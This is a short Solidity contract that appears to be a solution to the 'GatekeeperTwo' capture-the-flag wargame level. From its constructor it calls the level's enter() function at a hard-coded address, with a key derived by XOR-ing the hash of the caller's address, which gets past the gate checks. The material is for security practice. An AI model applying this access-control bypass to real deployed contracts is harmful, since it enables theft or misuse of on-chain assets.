// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/GatekeeperTwo.sol";

contract GatekeeperTwoSolution {
    constructor() {
        GatekeeperTwo gk = GatekeeperTwo(
            0xDceEb337EF5bA5C58B65B88cEDd84e810c260e63
        );
        bytes8 key = bytes8(
            type(uint64).max ^
                uint64(bytes8(keccak256(abi.encodePacked(address(this)))))
        );
        gk.enter(key);
    }
}
